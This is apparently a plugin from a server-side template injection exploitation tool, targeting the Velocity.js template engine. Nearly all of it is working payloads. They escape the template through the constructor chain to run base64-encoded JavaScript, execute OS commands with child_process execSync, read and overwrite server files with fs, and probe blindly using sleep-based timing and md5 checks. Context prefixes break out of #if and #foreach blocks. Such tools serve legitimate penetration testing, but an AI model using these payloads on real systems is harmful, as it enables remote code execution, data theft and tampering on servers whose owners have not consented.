from plugins.languages import javascript
from utils import rand

# TODO: process.mainModule may be undefined, needs replacement
class Velocity_js(javascript.Javascript):
    priority = 5
    plugin_info = {
        "Description": """Velocity.js template engine""",
        "Authors": [
            "Vladislav Korchagin @vladko312 https://github.com/vladko312",
        ],
        "Engine": [
            "Github: https://github.com/shepherdwind/velocity.js",
        ],
    }

    def init(self):
        self.update_actions({
            'render': {
                'header': """#set($h={header[0]}+{header[1]})$h#set($a="")#set($b=$a.constructor.constructor("return (""",
                'trailer': """).toString()"))$b()#set($t={trailer[0]}+{trailer[1]})$t""",
                'render': '{code}',
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'render_error': {
                'call': 'inject',
                'render': """{code}""",
                'header': """#set($a="")#set($b=$a.constructor.constructor("''['x'][({header[0]}+{header[1]}).toString()+""",
                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]"))$b()""",
                'test_render': f'typeof({rand.randints[0]})+{rand.randints[1]}',
                'test_render_expected': f'number{rand.randints[1]}'
            },
            'evaluate': {
                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
                'test_os': """global.process.mainModule.require('os').platform()"""
            },
            'evaluate_boolean': {
                'call': 'inject',
                'evaluate_blind': """#set($a="")#set($b=$a.constructor.constructor("[''][0+!eval(Buffer('{code_b64p}', 'base64').toString())]['length']"))$b()"""
            },
            'evaluate_blind': {
                'call': 'inject',
                'evaluate_blind': """#set($a="")#set($b=$a.constructor.constructor("eval(Buffer('{code_b64p}', 'base64').toString())&&global.process.mainModule.require('child_process').execSync('sleep {delay}')"))$b()"""
            },
            'execute': {
                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
            },
            'execute_boolean': {
                'call': 'evaluate_blind',
                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
                # TODO: use another function.
                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
            },
            'execute_blind': {
                'execute_blind': """#set($a="")#set($b=$a.constructor.constructor("global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')"))$b()"""
            },
            'write': {
                'write': """#set($a="")#set($b=$a.constructor.constructor("global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')"))$b()""",
                'truncate': """#set($a="")#set($b=$a.constructor.constructor("global.process.mainModule.require('fs').writeFileSync('{path}', '')"))$b()"""
            },
            'read': {
                'read': """global.process.mainModule.require('fs').readFileSync('{path}').toString('base64')"""
            },
            'md5': {
                'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')"""
            },
            'md5_blind': {
                'call': 'evaluate_blind',
                'md5_blind': "global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest('hex')=='{md5}'",
                'exists_blind': "global.process.mainModule.require('fs').existsSync('{path}')"
            },
        })

        self.set_contexts([
            # Text context, no closures
            {'level': 0},
            {'level': 1, 'prefix': '{closure})', 'suffix': '', 'closures': javascript.ctx_closures},
            # This catches
            # #if(%s == 1)\n#end
            # #foreach($item in %s)\n#end
            # #define( %s )a#end
            {'level': 3, 'prefix': '{closure}#end#if(1==1)', 'suffix': '', 'closures': javascript.ctx_closures},
            {'level': 5, 'prefix': '*#', 'suffix': '#*'},
        ])
